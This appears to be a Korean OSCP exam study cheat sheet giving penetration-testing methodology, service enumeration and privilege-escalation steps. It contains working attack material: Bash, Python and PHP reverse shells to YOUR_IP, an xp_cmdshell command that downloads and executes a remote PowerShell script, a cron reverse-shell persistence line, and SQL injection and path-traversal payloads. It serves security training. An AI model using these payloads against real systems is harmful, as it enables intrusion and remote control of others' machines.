# 🎯 OSCP 시험 합격을 위한 치트 시트 & 팁 모음

OSCP 시험에서 **Enumeration(이뉴머레이션)**은 핵심 중의 핵심입니다. 단순히 서비스 이름과 버전만 아는 것이 아니라, "서비스가 **어떻게 동작하는지** 이해하고, **비표준 사용**, **오용**, **구성 오류**까지 찾아낼 수 있어야" 합니다. 아래에 OSCP 방법론과 Enumeration 팁을 정리했습니다.

> ⚠️ **중요**: OSCP 시험에서는 자동화 도구(Metasploit, sqlmap 등) 사용이 제한됩니다. 이 문서는 모두 수동 방법 위주로 작성되었습니다.

---

## 🧠 OSCP 핵심 방법론(PTES 기반 개조)

### 1. **정보 수집 (Information Gathering)**

- **고급 Nmap 스캔**:

  ```bash
  # 빠른 초기 스캔 - 일반적인 포트
  sudo nmap -sS -T4 --min-rate=1000 -p- --open TARGET_IP -oN nmap.initial

  # 발견된 포트에 대한 상세 스캔
  sudo nmap -sC -sV -p[발견된 포트들] TARGET_IP -oA nmap.detailed

  # UDP 스캔 (자주 잊히는 부분)
  sudo nmap -sU --top-ports=20 TARGET_IP -oN nmap.udp
  ```

- **수동 서비스 확인**:

  ```bash
  # 웹 서버 확인
  curl -I http://TARGET_IP

  # 직접 서비스 연결 (예: SMTP)
  nc -nv TARGET_IP 25
  ```

### 2. **Enumeration (이뉴머레이션)**

- **각 서비스별 딥다이브 (후술)**
- **모든 정보 문서화**: 계정명, 비밀번호, 발견된 파일, 이메일 등
- **페이로드 테스트**: 수동으로 각 입력 필드 및 파라미터 검증

### 3. **취약점 식별**

- **수동 분석 기법**:

  - SQL 인젝션: `'`, `"`, `)`, `OR 1=1`, `admin' --`
  - 명령어 삽입: `;`, `&&`, `|`, `$(명령어)`, `` `명령어` ``
  - 경로 순회: `../../../etc/passwd`

- **CVE 수동 검색**:
  ```bash
  searchsploit [서비스명] [버전]
  ```
- **공개 exploit 코드 이해 및 수정**

### 4. **취약점 이용 (Exploitation)**

- **리버스 쉘 페이로드 모음**:

  ```bash
  # Bash
  bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

  # Python
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

  # PHP
  php -r '$sock=fsockopen("YOUR_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
  ```

- **쉘 안정화**:
  ```bash
  # 쉘 획득 후:
  python -c 'import pty; pty.spawn("/bin/bash")'
  ^Z (Ctrl+Z로 백그라운드로)
  stty raw -echo
  fg (쉘 다시 포그라운드로)
  export TERM=xterm
  ```

### 5. **권한 상승 (Privilege Escalation)**

- **자동 스크립트 대신 수동 체크**:

  ```bash
  # SUID 파일 찾기
  find / -perm -u=s -type f 2>/dev/null

  # 설정 파일의 민감한 정보
  find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "password"

  # sudo 권한 확인
  sudo -l

  # cron 작업 확인
  ls -la /etc/cron*
  ```

- **커널 익스플로잇 (최후의 수단)**
  ```bash
  uname -a
  cat /etc/issue
  ```

### 6. **루트 플래그 확인 후 증거 수집**

- **플래그 확인**: `proof.txt`, `local.txt`
- **추가 자격 증명 찾기**: 다른 시스템에 대한 액세스를 제공할 수 있음
- **스크린샷 캡처**: 각 중요한 단계마다

---

## 🔎 서비스별 심층 이뉴머레이션 가이드

### 1. **HTTP/HTTPS (웹 서비스) - 실전 접근법**

#### 🔵 초기 수동 분석

```bash
# 헤더 정보 확인
curl -I http://TARGET_IP

# 기초 웹 정보 수집
whatweb http://TARGET_IP

# 소스 코드 확인
curl http://TARGET_IP | less

# robots.txt 확인
curl http://TARGET_IP/robots.txt
```

#### 🔵 디렉토리/파일 발견

```bash
# 수동 웹 디렉토리 탐색
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,conf,bak
```

#### 🔵 고급 웹 취약점 확인

- **파일 업로드**: 확장자 우회 테스트 (`.php.jpg`, `.pHp5`, `.phtml`)
- **LFI 탐지**: `?file=../../../etc/passwd`
- **SQL 인젝션 (수동)**:
  ```
  ' OR 1=1 --
  " OR 1=1 --
  admin'--
  1' UNION SELECT 1,2,3,4,5--
  ```
- **XSS 점검 (낮은 우선순위)**: `<script>alert(1)</script>`

#### 🔵 실제 사례: WordPress 사이트

```bash
# 테마/플러그인 버전 확인
curl http://TARGET_IP/wp-content/themes/[테마이름]/style.css | grep Version

# 사용자 열거
wpscan --url http://TARGET_IP/wordpress --enumerate u
```

### 2. **SMB (139/445) - 전략적 접근**

#### 🔵 수동 열거

```bash
# 익명 접속 테스트
smbclient -L //TARGET_IP -N

# 특정 공유 접속
smbclient //TARGET_IP/share -N

# 공유 내 재귀적 파일 검색
mask ""
recurse ON
prompt OFF
ls
```

#### 🔵 RPC 정보 수집

```bash
# NULL 세션으로 연결
rpcclient -U "" -N TARGET_IP

# 사용자 열거
rpcclient $> enumdomusers
rpcclient $> queryuser 500

# 그룹 정보
rpcclient $> enumdomgroups
```

#### 🔵 SMB 버전 확인 (CVE 검색용)

```bash
# SMB 버전 수동 체크
ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]' 'host TARGET_IP and port 139'
```

#### 🔵 실제 사례: 민감한 파일 발견

```bash
# SMB 공유에서 발견된 .bak 파일 분석
smbclient //TARGET_IP/backups
smb: \> get config.php.bak
smb: \> exit
cat config.php.bak
```

### 3. **SSH (22) - 관점 전환**

#### 🔵 표준 접근법

```bash
# 배너 정보 수집
nc -nv TARGET_IP 22

# 키 기반 인증 시도 (발견한 키 파일 사용)
chmod 600 id_rsa
ssh -i id_rsa user@TARGET_IP
```

#### 🔵 SSH 비표준 시나리오

- **약한 암호화 방식 악용**:
  ```bash
  ssh -o KexAlgorithms=diffie-hellman-group1-sha1 -o HostKeyAlgorithms=ssh-rsa user@TARGET_IP
  ```
- **특정 SSH 버전 취약점** (예: OpenSSH 7.2p2의 user enumeration):
  ```bash
  python3 ssh_user_enum.py --port 22 --userList users.txt TARGET_IP
  ```

#### 🔵 실제 사례: SSH 키 찾기

다른 서비스에서 SSH 키를 찾아 액세스한 예:

```bash
# FTP에서 발견한 비공개 키
ftp> get .ssh/id_rsa

# 올바른 권한 설정
chmod 600 id_rsa

# SSH 연결
ssh -i id_rsa user@TARGET_IP
```

### 4. **FTP (21) - 창의적 열거**

#### 🔵 기본 접근

```bash
# 익명 접속
ftp TARGET_IP
> anonymous
> (비밀번호 없이 엔터)

# 모든 파일 확인 (숨김 파일 포함)
ls -la
```

#### 🔵 고급 FTP 시나리오

- **업로드 권한 테스트**:

  ```bash
  # 테스트 파일 생성
  echo "test" > test.txt

  # 업로드 시도
  ftp> put test.txt
  ```

- **FTP 버전 취약점**:
  ```bash
  # ProFTPD 취약점 확인
  searchsploit proftpd 1.3.5
  ```

#### 🔵 실제 사례: 디렉토리 순회 취약점

```bash
# FTP에서 디렉토리 순회
ftp> cd ../../../etc
ftp> get passwd
```

### 5. **MSSQL (1433) - 심층 탐색**

#### 🔵 기본 열거

```bash
# 포트 상태 확인
nmap -p 1433 --script ms-sql-info TARGET_IP

# 연결 테스트
sqsh -S TARGET_IP -U sa
```

#### 🔵 고급 MSSQL 이용

- **xp_cmdshell 실행 권한 확인**:
  ```sql
  EXEC master..xp_cmdshell 'whoami'
  ```
- **계정 권한 상승**:
  ```sql
  SELECT is_srvrolemember('sysadmin')
  ```

#### 🔵 실제 사례: xp_cmdshell을 통한 RCE

```sql
-- xp_cmdshell 활성화
EXEC sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXEC sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO

-- 명령어 실행
EXEC master..xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).downloadString(''http://YOUR_IP/shell.ps1'')"'
```

### 6. **SNMP (161/UDP) - 눈에 띄지 않는 보물창고**

#### 🔵 커뮤니티 문자열 테스트

```bash
# 기본 커뮤니티 문자열 확인
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt TARGET_IP

# MIB 트리 열거
snmpwalk -v1 -c public TARGET_IP
```

#### 🔵 중요 OID 확인

```bash
# 실행 중인 프로세스
snmpwalk -v1 -c public TARGET_IP 1.3.6.1.2.1.25.4.2.1.2

# 설치된 소프트웨어
snmpwalk -v1 -c public TARGET_IP 1.3.6.1.2.1.25.6.3.1.2

# 시스템 사용자
snmpwalk -v1 -c public TARGET_IP 1.3.6.1.4.1.77.1.2.25
```

#### 🔵 실제 사례: SNMP에서 발견한 민감한 정보

```bash
# SNMP를 통해 발견한 내부 IP
snmpwalk -v2c -c public TARGET_IP | grep -i address

# 발견한 사용자 계정 추출
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.4.1.77.1.2.25 | cut -d ":" -f4
```

---

## 🛠️ 권한 상승 고급 전략

### 1. **리눅스 권한 상승 - 체계적 접근**

#### 🔵 기본 시스템 열거

```bash
# 시스템 정보
uname -a
cat /etc/issue
cat /proc/version

# 설치된 패키지
dpkg -l | grep -i "linux-image"
rpm -qa | grep kernel

# 사용자 및 그룹
id
sudo -l
cat /etc/passwd | grep -v "nologin\|false"
```

#### 🔵 SUID/SGID 파일 검색

```bash
# SUID 파일
find / -perm -4000 -type f 2>/dev/null

# SGID 파일
find / -perm -2000 -type f 2>/dev/null

# 둘 다
find / -perm -u=s,g=s -type f 2>/dev/null
```

#### 🔵 설정 파일 검색

```bash
# World-writable 설정 파일
find /etc -type f -writable -exec ls -la {} \; 2>/dev/null

# 홈 디렉토리 숨겨진 파일
find /home -type f -name ".*" 2>/dev/null
```

#### 🔵 실제 사례: 예상치 못한 권한 상승 경로

```bash
# 텍스트 에디터에 SUID 권한이 있는 경우
sudo vi -c ':!/bin/sh' /dev/null

# Cron 작업 악용
echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> /var/spool/cron/username
```

### 2. **윈도우 권한 상승 - 체계적 접근**

#### 🔵 기본 시스템 열거

```powershell
# 시스템 정보
systeminfo

# 패치 상태
wmic qfe get Caption,Description,HotFixID,InstalledOn

# 사용자 정보
net user
net localgroup administrators
```

#### 🔵 서비스 권한 문제

```powershell
# 서비스 권한 확인
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# 수정 가능한 서비스 파일
icacls "C:\Program Files\Vulnerable Service\service.exe"
```

#### 🔵 실제 사례: Always Install Elevated

```powershell
# 레지스트리 키 확인
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 취약점 악용
msiexec /quiet /qn /i malicious.msi
```

---

## 📊 시간 관리와 문제 해결 전략

### 1. **시험 시간 계획**

- **0-2시간**: 첫 머신 초기 열거 및 공격 시도
- **2-4시간**: 문제가 있는 경우 두 번째 머신으로 전환
- **4-12시간**: 나머지 세 머신에 시간 분배
- **12-20시간**: 막힌 머신으로 돌아가 다시 시도
- **20-24시간**: 보고서 작성 시작

### 2. **막힐 때 대처법**

| 상황                                | 대처법                                                                        |
| ----------------------------------- | ----------------------------------------------------------------------------- |
| 웹사이트에서 취약점이 안 보임       | 모든 입력 필드, URL 파라미터, 쿠키, HTTP 헤더까지 확인                        |
| 계정 정보를 찾았는데 로그인이 안 됨 | 해당 계정이 다른 서비스(SSH, FTP 등)에도 사용되는지 시도                      |
| 쉘을 획득했지만 권한 상승이 안 됨   | PATH, 크론잡, NFS, 내부 포트 등 내부 네트워크 측면 조사                       |
| 제한된 쉘에서 명령어가 제한적임     | 셸 이스케이프: `echo $SHELL`, `python -c 'import pty;pty.spawn("/bin/bash")'` |

### 3. **실제 사례: 문제 해결 과정**

**사례 1: 숨겨진 웹 디렉토리**

1. 기본 gobuster와 디렉토리 목록이 아무것도 발견 못함
2. 다른 워드리스트로 시도: `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
3. 발견된 `/backup` 디렉토리에 db 크레덴셜 발견
4. 그 크레덴셜로 CMS 관리자 로그인 성공

**사례 2: 예상치 못한 권한 상승**

1. 일반적인 SUID, sudo 권한 확인 결과 없음
2. `find / -writable -type f 2>/dev/null` 명령으로 쓰기 가능한 파일 탐색
3. 시스템 라이브러리 파일이 쓰기 가능한 것을 발견
4. 라이브러리 파일을 악의적인 코드로 바꾸고 서비스 재시작
5. 관리자 권한 획득

---

## 🧩 OSCP 시험 성공을 위한 마무리 조언

### 1. **연습 방법론**

- **진행 상황을 항상 문서화**: 모든 명령어와 결과를 기록
- **실패한 시도도 기록**: 나중에 참고하기 위해
- **60-90분 타이머 설정**: 진행 상황 정기적으로 평가
- **범위를 좁혀가며 접근**: 너무 많은 가능성을 동시에 조사하지 말 것

### 2. **마인드셋**

- **"왜"를 항상 고민**: 왜 이 취약점이 있는지, 왜 이 서비스가 여기 있는지
- **맥락 이해**: 시스템 목적과 설정이 공격 표면에 미치는 영향
- **단순한 것부터 시작**: 복잡한 익스플로잇 전에 기본적인 오류 확인
- **해킹 = 인내 + 창의력 + 체계적 접근**

### 3. **실제 취약점 발견 패턴**

- **어디서 취약점이 발견되는가?**:
  - 업데이트되지 않은 오래된 소프트웨어
  - 기본 비밀번호가 변경되지 않은 서비스
  - 잘못 구성된 권한 (과도한 권한)
  - 필터링되지 않은 사용자 입력
  - 하드코딩된 자격 증명

---

## 🧒 어린이 버전 요약

> 해킹 시험은 숨겨진 보물을 찾는 게임이에요. 컴퓨터랑 대화하면서 "여기 뭐 숨겼니?", "이 파일 안에 뭐 있어?", "혹시 이걸로 문 열 수 있어?" 하고 계속 물어보는 거예요. 대답을 잘 들어주면 열쇠가 나와요! 영화처럼 키보드 막 두드리는 게 아니라, 차근차근 수수께끼를 푸는 탐정이 되는 거랍니다. 모든 서비스는 비밀의 문이고, 그 문을 여는 방법을 차근차근 알아가는 게 OSCP 시험이에요!

---

## 📝 최종 체크리스트

1. **시스템마다 이것만은 꼭 확인**:

   - [ ] 모든 열린 포트와 서비스 확인 (TCP/UDP)
   - [ ] 웹 서비스가 있다면 디렉토리 열거 및 소스 코드 분석
   - [ ] 파일 공유 서비스에서 모든 파일 확인
   - [ ] 발견된 자격 증명을 다른 모든 서비스에 시도
   - [ ] 쉘 획득 후 기본 권한 상승 벡터 확인

2. **보고서 작성에 필요한 것**:
   - [ ] 각 단계마다 명령어와 출력 스크린샷
   - [ ] 취약점 설명 및 재현 단계
   - [ ] 완화 방법 간략 제시
   - [ ] proof.txt와 local.txt 증명
